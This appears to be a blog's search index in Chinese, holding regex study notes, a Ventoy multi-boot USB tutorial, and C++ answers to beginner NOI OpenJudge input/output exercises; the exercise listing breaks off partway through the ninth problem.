<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>正则表达式学习笔记</title>
      <link href="/p/2023/7cb564cd/"/>
      <url>/p/2023/7cb564cd/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是正则表达式？"><a href="#什么是正则表达式？" class="headerlink" title="什么是正则表达式？"></a>什么是正则表达式？</h2><p>正则表达式是一种特殊的文本模式，它用来匹配和搜索文本中的模式。在计算机科学中，正则表达式通常被用来进行文本搜索和文本替换操作，例如在程序中查找或替换特定的字符串。</p><p>正则表达式具有很强的灵活性，可以用于处理不同的文本数据，包括数字、字母、标点符号、空格等等。它可以匹配不同的字符串，包括单个字符、字符串的开头或结尾、一组字符、一组字符中的任意字符等等。</p><h2 id="正则表达式的基础语法"><a href="#正则表达式的基础语法" class="headerlink" title="正则表达式的基础语法"></a>正则表达式的基础语法</h2><p>正则表达式由字符和元字符组成。其中，字符是指匹配文本中的普通字符，例如数字、字母、标点符号等等；元字符是指具有特殊含义的字符，用于定义匹配规则。</p><p>下面是一些常见的元字符：</p><table><thead><tr><th>元字符</th><th>描述</th></tr></thead><tbody><tr><td>.</td><td>匹配除了换行符以外的任意字符</td></tr><tr><td>\d</td><td>匹配任意数字</td></tr><tr><td>\w</td><td>匹配任意字母、数字和下划线</td></tr><tr><td>\s</td><td>匹配任意空格字符</td></tr><tr><td>^</td><td>匹配字符串的开头</td></tr><tr><td>$</td><td>匹配字符串的结尾</td></tr><tr><td>*</td><td>匹配前面的字符零次或多次</td></tr><tr><td>+</td><td>匹配前面的字符一次或多次</td></tr><tr><td>?</td><td>匹配前面的字符零次或一次</td></tr><tr><td>{n}</td><td>匹配前面的字符恰好 n 次</td></tr><tr><td>{n,m}</td><td>匹配前面的字符至少 n 次，至多 m 次</td></tr><tr><td>[…]</td><td>匹配一组字符中的任意一个字符</td></tr><tr><td>[^…]</td><td>匹配不在一组字符中的任意一个字符</td></tr><tr><td>(…)</td><td>分组，用于捕获匹配的子字符串</td></tr></tbody></table><p>下面是一些实例：</p><table><thead><tr><th>正则表达式</th><th>描述</th></tr></thead><tbody><tr><td>\d{3}</td><td>匹配任意三位数字</td></tr><tr><td>\w+</td><td>匹配任意一个或多个字母、数字和下划线</td></tr><tr><td>\s*</td><td>匹配任意零个或多个空格字符</td></tr><tr><td>^\w</td><td>匹配以字母或下划线开头的字符串</td></tr><tr><td>\d$</td><td>匹配以数字结尾的字符串</td></tr><tr><td>[aeiou]</td><td>匹配任意一个元音字母</td></tr><tr><td>[^aeiou]</td><td>匹配任意一个非元音字母</td></tr><tr><td>(ab)+</td><td>匹配一个或多个连续的 “ab” 字符串</td></tr></tbody></table><h2 id="正则表达式的应用场景"><a href="#正则表达式的应用场景" class="headerlink" title="正则表达式的应用场景"></a>正则表达式的应用场景</h2><p>正则表达式可以用于处理各种不同类型的文本数据，例如邮箱地址、电话号码、URL地址、IP地址等等。下面是一些常见的应用场景：</p><h3 id="1-邮箱地址的匹配"><a href="#1-邮箱地址的匹配" class="headerlink" title="1. 邮箱地址的匹配"></a>1. 邮箱地址的匹配</h3><p>邮箱地址通常由用户名和域名两部分组成，其中用户名由字母、数字和下划线组成，域名由一组或多组由点号分隔的字母和数字组成。使用正则表达式可以方便地匹配和验证邮箱地址的格式是否正确。</p><p>下面是一个匹配邮箱地址的正则表达式：</p><pre class="line-numbers language-none"><code class="language-none">^\w+@[a-zA-Z_]+?\.[a-zA-Z]&#123;2,3&#125;$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，^ 表示匹配字符串的开头，\w+ 表示匹配一个或多个字母、数字和下划线作为用户名，@ 表示匹配 @ 符号，[a-zA-Z_]+? 表示匹配一个或多个字母和下划线作为域名的第一部分，. 表示匹配点号，[a-zA-Z]{2,3} 表示匹配两个或三个字母作为域名的第二部分和第三部分。</p><h3 id="2-电话号码的匹配"><a href="#2-电话号码的匹配" class="headerlink" title="2. 电话号码的匹配"></a>2. 电话号码的匹配</h3><p>电话号码的格式通常有很多种，例如国内的固定电话号码和手机号码，以及国际电话号码等等。使用正则表达式可以方便地匹配和验证不同类型的电话号码的格式是否正确。</p><p>下面是一个匹配国内手机号码的正则表达式：</p><pre class="line-numbers language-none"><code class="language-none">^1[3-9]\d&#123;9&#125;$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，^ 表示匹配字符串的开头，1 表示匹配数字 1，[3-9] 表示匹配数字 3 到 9 中的任意一个数字，\d{9} 表示匹配任意九个数字作为手机号码，$ 表示匹配字符串的结尾。</p><h3 id="3-URL地址的匹配"><a href="#3-URL地址的匹配" class="headerlink" title="3. URL地址的匹配"></a>3. URL地址的匹配</h3><p>URL地址是指网站的地址，通常由协议名、域名、端口号和路径等部分组成。使用正则表达式可以方便地匹配和解析不同类型的URL地址。</p><p>下面是一个匹配 HTTP 或 HTTPS 协议的URL地址的正则表达式：</p><pre class="line-numbers language-none"><code class="language-none">^(https?:&#x2F;&#x2F;)?[a-zA-Z0-9\-]+\.[a-zA-Z]&#123;2,&#125;(:\d+)?(&#x2F;[\w\-]*)*$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，^(https?:&#x2F;&#x2F;)? 表示匹配 http 或 https 协议，[a-zA-Z0-9-]+ 表示匹配一个或多个字母、数字和横杠作为域名，.[a-zA-Z]{2,} 表示匹配一个点号和两个或三个字母作为顶级域名和次级域名，(:\d+)? 表示匹配一个冒号和一个或多个数字作为端口号，(&#x2F;[\w-]<em>)</em> 表示匹配一个或多个由斜杠、字母、数字和横杠组成的路径部分，* 表示路径部分可以出现零次或多次。</p><h3 id="4-IP地址的匹配"><a href="#4-IP地址的匹配" class="headerlink" title="4. IP地址的匹配"></a>4. IP地址的匹配</h3><p>IP地址是指网络设备的地址，通常由四个以点号分隔的数字组成，每个数字的范围是从 0 到 255。使用正则表达式可以方便地匹配和验证IP地址的格式是否正确。</p><p>下面是一个匹配 IPv4 地址的正则表达式：</p><pre class="line-numbers language-none"><code class="language-none">^(25[0-5]|2[0-4]\d|[0-1]?\d&#123;1,2&#125;)\.(25[0-5]|2[0-4]\d|[0-1]?\d&#123;1,2&#125;)\.(25[0-5]|2[0-4]\d|[0-1]?\d&#123;1,2&#125;)\.(25[0-5]|2[0-4]\d|[0-1]?\d&#123;1,2&#125;)$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，^ 表示匹配字符串的开头，$ 表示匹配字符串的结尾，(25[0-5]|2[0-4]\d|[0-1]?\d{1,2}) 表示匹配从 0 到 255 范围内的数字，[0-1]?\d{1,2} 表示匹配从 0 到 199 范围内的数字。</p><h3 id="5-HTML标签的匹配"><a href="#5-HTML标签的匹配" class="headerlink" title="5. HTML标签的匹配"></a>5. HTML标签的匹配</h3><p>HTML标签是指在网页上显示的元素，例如标题、段落、图片、链接等等。使用正则表达式可以方便地匹配和解析HTML标签的内容。</p><p>下面是一个匹配HTML标签的正则表达式：</p><pre class="line-numbers language-none"><code class="language-none">&lt;(\w+)(\s+(\w+)\s*&#x3D;\s*(&quot;[^&quot;]*&quot;|&#39;[^&#39;]*&#39;|[^&#39;&quot;&gt;\s]+))*\s*&#x2F;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，&lt; 表示匹配左尖括号，\w+ 表示匹配一个或多个字母、数字和下划线作为标签名，(\s+(\w+)\s*&#x3D;\s*(“[^”]<em>“|’[^’]*’|[^’”&gt;\s]+))</em> 表示匹配零个或多个属性，\s* 表示匹配零个或多个空白字符，”[^”]<em>“|’[^’]</em>‘|[^’”&gt;\s]+ 表示匹配双引号、单引号或无引号的属性值，\s*&#x2F;? 表示匹配可选的结束标记。</p><h2 id="正则表达式的语法规则"><a href="#正则表达式的语法规则" class="headerlink" title="正则表达式的语法规则"></a>正则表达式的语法规则</h2><p>正则表达式的语法规则比较复杂，但是只要掌握了一些基本的概念，就可以很容易地理解和编写正则表达式。下面是一些常用的语法规则：</p><h3 id="1-字符组和字符集合"><a href="#1-字符组和字符集合" class="headerlink" title="1. 字符组和字符集合"></a>1. 字符组和字符集合</h3><p>字符组是指一组字符的集合，用方括号 [] 括起来表示，例如 [abc] 表示匹配 a、b 或 c 中的任意一个字符。字符组中的字符可以使用连字符 - 表示一个范围，例如 [a-z] 表示匹配任意小写字母，[0-9] 表示匹配任意数字。</p><p>字符集合是指一组字符的集合，用 \ 转义字符加上一个特定的字符表示，例如 \d 表示匹配任意数字，\w 表示匹配任意字母、数字和下划线，\s 表示匹配任意空白字符。</p><h3 id="2-量词"><a href="#2-量词" class="headerlink" title="2. 量词"></a>2. 量词</h3><p>量词是指一个或多个字符的重复出现次数，用在字符或字符组后面，例如 a* 表示匹配零个或多个字符 a，a+ 表示匹配一个或多个字符 a，a? 表示匹配零个或一个字符 a，a{m,n} 表示匹配 m 到 n 个字符 a。</p><h3 id="3-贪婪和非贪婪匹配"><a href="#3-贪婪和非贪婪匹配" class="headerlink" title="3. 贪婪和非贪婪匹配"></a>3. 贪婪和非贪婪匹配</h3><p>贪婪匹配是指在可能的情况下尽可能多地匹配字符，例如 .* 表示匹配任意字符，包括换行符，直到遇到下一个匹配项。</p><p>非贪婪匹配是指在可能的情况下尽可能少地匹配字符，例如 .*? 表示匹配任意字符，包括换行符，直到下一个匹配项为止。</p><h2 id="正则表达式的实例"><a href="#正则表达式的实例" class="headerlink" title="正则表达式的实例"></a>正则表达式的实例</h2><p>下面是一些常用的正则表达式实例：</p><table><thead><tr><th>正则表达式</th><th>匹配字符串</th></tr></thead><tbody><tr><td>\d{3}-\d{4}-\d{4}</td><td>匹配电话号码，例如 189-1111-1111</td></tr><tr><td>[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+.[a-zA-Z]{2,}</td><td>匹配电子邮件地址，例如 <a href="mailto:&#117;&#115;&#101;&#x72;&#x40;&#x65;&#120;&#x61;&#x6d;&#112;&#x6c;&#101;&#x2e;&#x63;&#111;&#x6d;">&#117;&#115;&#101;&#x72;&#x40;&#x65;&#120;&#x61;&#x6d;&#112;&#x6c;&#101;&#x2e;&#x63;&#111;&#x6d;</a></td></tr><tr><td>^(http</td><td>https):&#x2F;&#x2F;[a-zA-Z0-9.&#x2F;?%&amp;&#x3D;:_-]+$</td></tr><tr><td>^[a-zA-Z0-9_]{5,15}$</td><td>匹配用户名，例如 user_123</td></tr><tr><td>^\d{6}$</td><td>匹配中国邮政编码，例如 123456</td></tr><tr><td>^\d{5}(-\d{4})?$</td><td>匹配美国邮政编码，例如 12345 或 12345-6789</td></tr><tr><td>^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$</td><td>匹配 MAC 地址，例如 00:11:22:33:44:55</td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>正则表达式是一种强大的文本匹配工具，它可以方便地匹配和解析各种文本格式，例如电子邮件地址、电话号码、URL 地址、HTML 标签等等。在编写正则表达式时，需要注意正则表达式的语法规则和量词的使用方式，以及贪婪匹配和非贪婪匹配的区别。同时，还需要根据具体的需求来选择合适的字符集合和量词，以达到最佳的匹配效果。</p><p>除了在编程中使用正则表达式，许多文本编辑器和IDE也支持使用正则表达式进行搜索和替换。因此，掌握正则表达式对于开发者和文本编辑工作者来说是非常重要的技能之一。</p><p>参考资料：</p><ul><li><a href="https://deerchao.cn/tutorials/regex/regex.htm">正则表达式30分钟入门教程</a></li><li><a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式指南</a></li><li><a href="https://www.regular-expressions.info/tutorial.html">正则表达式入门教程</a></li></ul><p>以上是本篇正则表达式学习笔记的内容，希望对你学习和使用正则表达式有所帮助。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用Ventoy进行U盘的多系统启动</title>
      <link href="/p/2023/ea2479bd/"/>
      <url>/p/2023/ea2479bd/</url>
      
        <content type="html"><![CDATA[<h1 id="Ventoy-简介"><a href="#Ventoy-简介" class="headerlink" title="Ventoy 简介"></a>Ventoy 简介</h1><p>Ventoy是一个制作可启动U盘的开源工具。<br>有了Ventoy你就无需反复地格式化U盘，你只需要把 ISO&#x2F;WIM&#x2F;IMG&#x2F;VHD(x)&#x2F;EFI 等类型的文件直接拷贝到U盘里面就可以启动了，无需其他操作。<br>你可以一次性拷贝很多个不同类型的镜像文件，Ventoy 会在启动时显示一个菜单来供你进行选择。<br>你还可以在 Ventoy 的界面中直接浏览并启动本地硬盘中的 ISO&#x2F;WIM&#x2F;IMG&#x2F;VHD(x)&#x2F;EFI 等类型的文件。<br>Ventoy 安装之后，同一个U盘可以同时支持 x86 Legacy BIOS、IA32 UEFI、x86_64 UEFI、ARM64 UEFI 和 MIPS64EL UEFI 模式，同时还不影响U盘的日常使用。</p><h1 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h1><p>下载地址：<a href="https://www.ventoy.net/cn/download.html">Download Ventoy</a><br>到 Ventoy 官网下载 Windows 版的安装包，运行 Ventoy2Disk 后如下：<br><img src="https://s2.loli.net/2023/01/05/gpTEfSVLtqQ5n1i.png" alt="Ventoy"><br>在“设备”一栏中选择你U盘的名称，点击“安装”按钮，等待安装完成后，你可能会看到一个分区或者两个分区。如果没有看到就说明没安装好。<br>这时候我们就可以把 ISO、IMG 等文件放进空间大的那个分区里面去了，你可以放系统的 ISO 安装镜像，也可以放诊断、修复系统的PE文件（如微PE、FirPE等）。</p><h1 id="启动U盘"><a href="#启动U盘" class="headerlink" title="启动U盘"></a>启动U盘</h1><p>在电脑关机时插入U盘，开机后按BIOS设置键，进入BIOS设置，选择U盘启动，启动后可以按上下键选择需要启动的文件，按回车确定启动。<br>如果不知道BIOS设置键可以自行搜索。</p><p>大家有什么不懂的欢迎讨论！</p>]]></content>
      
      
      <categories>
          
          <category> Ventoy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ventoy </tag>
            
            <tag> 多系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NOI题库答案（1.1-编程基础之输入输出）</title>
      <link href="/p/2022/250970e4/"/>
      <url>/p/2022/250970e4/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="/js/bai.js"></script><p>NOI题库网址：<a href="http://noi.openjudge.cn/">http://noi.openjudge.cn/</a></p><h2 id="1-1-01：Hello，World！"><a href="#1-1-01：Hello，World！" class="headerlink" title="1.1-01：Hello，World！"></a>1.1-01：Hello，World！</h2><p>总时间限制: 1000ms    内存限制: 65536kB</p><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>对于大部分编程语言来说，编写一个能够输出“Hello, World!”的程序往往是最基本、最简单的。因此，这个程序常常作为一个初学者接触一门新的编程语言所写的第一个程序，也经常用来测试开发、编译环境是否能够正常工作。<br>现在你就需要完成这样一个程序。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>无。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>一行，仅包含一个字符串：“Hello, World!”</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><pre class="line-numbers language-none"><code class="language-none">（无）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><pre class="line-numbers language-none"><code class="language-none">Hello, World!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>使用英文标点符号；逗号后面有一个空格。</p><h3 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;using namespace std;int main()&#123;    cout&lt;&lt;&quot;Hello, World!&quot;&lt;&lt;endl;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-1-02：输出第二个整数"><a href="#1-1-02：输出第二个整数" class="headerlink" title="1.1-02：输出第二个整数"></a>1.1-02：输出第二个整数</h2><p>总时间限制: 1000ms     内存限制: 65536kB</p><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>输入三个整数，把第二个输入的整数输出。</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>只有一行，共三个整数，整数之间由一个空格分隔。整数是32位有符号整数。</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>只有一行，一个整数，即输入的第二个整数。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><pre class="line-numbers language-none"><code class="language-none">123 456 789<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><pre class="line-numbers language-none"><code class="language-none">456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;using namespace std;int main() &#123;int a[3];        &#x2F;&#x2F;开辟一个数组int i,j;for (i &#x3D; 0 ; i &lt; 3 ; i++)    &#123;cin&gt;&gt;a[i];&#125;                    &#x2F;&#x2F;输入三个数cout&lt;&lt;a[1];        &#x2F;&#x2F;输出第二个数return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-1-03：对齐输出"><a href="#1-1-03：对齐输出" class="headerlink" title="1.1-03：对齐输出"></a>1.1-03：对齐输出</h2><p>总时间限制: 1000ms    内存限制: 65536kB</p><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>读入三个整数，按每个整数占8个字符的宽度，右对齐输出它们。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>只有一行，包含三个整数，整数之间以一个空格分开。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>只有一行，按照格式要求依次输出三个整数，之间以一个空格分开。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><pre class="line-numbers language-none"><code class="language-none">123456789 0 -1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><pre class="line-numbers language-none"><code class="language-none">123456789        0       -1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="答案-2"><a href="#答案-2" class="headerlink" title="答案"></a>答案</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;iomanip&gt;using namespace std;int main() &#123;int a[3];int i,j;for ( i &#x3D; 0 ; i &lt; 3 ; i++)cin&gt;&gt;a[i];for ( i &#x3D; 0 ; i &lt; 3 ; i++)cout&lt;&lt;setw(8)&lt;&lt;a[i]&lt;&lt;&quot; &quot;;        &#x2F;&#x2F;setw（）表示要占多少个空格return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-1-04：输出保留3位小数的浮点数"><a href="#1-1-04：输出保留3位小数的浮点数" class="headerlink" title="1.1-04：输出保留3位小数的浮点数"></a>1.1-04：输出保留3位小数的浮点数</h2><p>总时间限制: 1000ms     内存限制:65536kB</p><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>读入一个单精度浮点数，保留3位小数输出这个浮点数。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>只有一行，一个单精度浮点数。</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>也只有一行，读入的单精度浮点数。</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><pre class="line-numbers language-none"><code class="language-none">12.34521<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><pre class="line-numbers language-none"><code class="language-none">12.345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="答案-3"><a href="#答案-3" class="headerlink" title="答案"></a>答案</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std;int main()&#123;float n;cin&gt;&gt;n;printf(&quot;%.3lf&quot;,n);        &#x2F;&#x2F;%.数字f或%.数字lf表示保留几位小数return 0;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-1-05：输出保留12位小数的浮点数"><a href="#1-1-05：输出保留12位小数的浮点数" class="headerlink" title="1.1-05：输出保留12位小数的浮点数"></a>1.1-05：输出保留12位小数的浮点数</h2><p>总时间限制: 1000ms    内存限制: 65536kB</p><h3 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h3><p>读入一个双精度浮点数，保留12位小数，输出这个浮点数。</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>只有一行，一个双精度浮点数。</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>也只有一行，保留12位小数的浮点数。</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><pre class="line-numbers language-none"><code class="language-none">3.1415926535798932<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><pre class="line-numbers language-none"><code class="language-none">3.141592653580<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="答案-4"><a href="#答案-4" class="headerlink" title="答案"></a>答案</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std;int main()&#123;double n;cin&gt;&gt;n;printf(&quot;%.12lf&quot;,n);return 0;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-1-06：空格分隔输出"><a href="#1-1-06：空格分隔输出" class="headerlink" title="1.1-06：空格分隔输出"></a>1.1-06：空格分隔输出</h2><p>总时间限制: 1000ms    内存限制: 65536kB</p><h3 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h3><p>读入一个字符，一个整数，一个单精度浮点数，一个双精度浮点数，然后按顺序输出它们，并且要求在他们之间用一个空格分隔。输出浮点数时保留6位小数。</p><h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><p>共有四行：<br>第一行是一个字符；<br>第二行是一个整数；<br>第三行是一个单精度浮点数；<br>第四行是一个双精度浮点数。</p><h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><p>输出字符、整数、单精度浮点数和双精度浮点数，之间用空格分隔。</p><h3 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h3><pre class="line-numbers language-none"><code class="language-none">a122.33.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h3><pre class="line-numbers language-none"><code class="language-none">a 12 2.300000 3.200000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="答案-5"><a href="#答案-5" class="headerlink" title="答案"></a>答案</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std;int main()&#123;    char a;    int b;    float c;    double d;    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c&gt;&gt;d;    printf(&quot;%c %d %f %f\n&quot;,a,b,c,d);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-1-07：输出浮点数"><a href="#1-1-07：输出浮点数" class="headerlink" title="1.1-07：输出浮点数"></a>1.1-07：输出浮点数</h2><p>总时间限制: 1000ms    内存限制: 65536kB</p><h3 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h3><p>读入一个双精度浮点数，分别按输出格式“%f”，“%f”保留5位小数，“%e”和“%g”的形式输出这个整数，每次在单独一行上输出。</p><h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><p>一个双精度浮点数。</p><h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><p>输出有四行：<br>第一行是按“%f”输出的双精度浮点数；<br>第二行是按“%f”保留5位小数输出的双精度浮点数；<br>第三行是按“%e”输出的双精度浮点数；<br>第四行是按“%g”输出的双精度浮点数。</p><h3 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h3><pre class="line-numbers language-none"><code class="language-none">12.3456789<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h3><pre class="line-numbers language-none"><code class="language-none">12.34567912.345681.234568e+00112.3457<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="答案-6"><a href="#答案-6" class="headerlink" title="答案"></a>答案</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;iomanip&gt;using namespace std;int main() &#123;double a;scanf(&quot;%lf&quot;,&amp;a);printf(&quot;%lf\n&quot;,a);printf(&quot;%0.5lf\n&quot;,a);printf(&quot;%e\n&quot;,a);printf(&quot;%g\n&quot;,a);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-1-08：字符三角形"><a href="#1-1-08：字符三角形" class="headerlink" title="1.1-08：字符三角形"></a>1.1-08：字符三角形</h2><p>总时间限制: 1000ms    内存限制: 65536kB</p><p>###描述<br>给定一个字符，用它构造一个底边长5个字符，高3个字符的等腰字符三角形。</p><h3 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h3><p>输入只有一行， 包含一个字符。</p><h3 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h3><p>该字符构成的等腰三角形，底边长5个字符，高3个字符。</p><h3 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h3><pre class="line-numbers language-none"><code class="language-none">*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h3><pre class="line-numbers language-none"><code class="language-none">  * ********<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="答案-7"><a href="#答案-7" class="headerlink" title="答案"></a>答案</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;iostream&gt;using namespace std;int main()&#123;char n;cin&gt;&gt;n;  cout&lt;&lt;&quot;  &quot;&lt;&lt;n&lt;&lt;endl;cout&lt;&lt;&quot; &quot;&lt;&lt;n&lt;&lt;n&lt;&lt;n&lt;&lt;endl;cout&lt;&lt;n&lt;&lt;n&lt;&lt;n&lt;&lt;n&lt;&lt;n&lt;&lt;endl;    return 0;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-1-09：字符菱形"><a href="#1-1-09：字符菱形" class="headerlink" title="1.1-09：字符菱形"></a>1.1-09：字符菱形</h2><p>总时间限制: 1000ms    内存限制: 65536kB</p><h3 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h3><p>给定一个字符，用它构造一个对角线长5个字符，倾斜放置的菱形。</p><h3 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h3><p>输入只有一行， 包含一个字符。</p><h3 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h3><p>该字符构成的菱形。</p><h3 id="样例输入-8"><a href="#样例输入-8" class="headerlink" title="样例输入"></a>样例输入</h3><pre class="line-numbers language-none"><code class="language-none">*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="样例输出-8"><a href="#样例输出-8" class="headerlink" title="样例输出"></a>样例输出</h3><pre class="line-numbers language-none"><code class="language-none">  * ******** ***  *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="答案-8"><a href="#答案-8" class="headerlink" title="答案"></a>答案</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;using namespace std;int main()&#123;char n;cin&gt;&gt;n; cout&lt;&lt;&quot;  &quot;&lt;&lt;n&lt;&lt;endl;cout&lt;&lt;&quot; 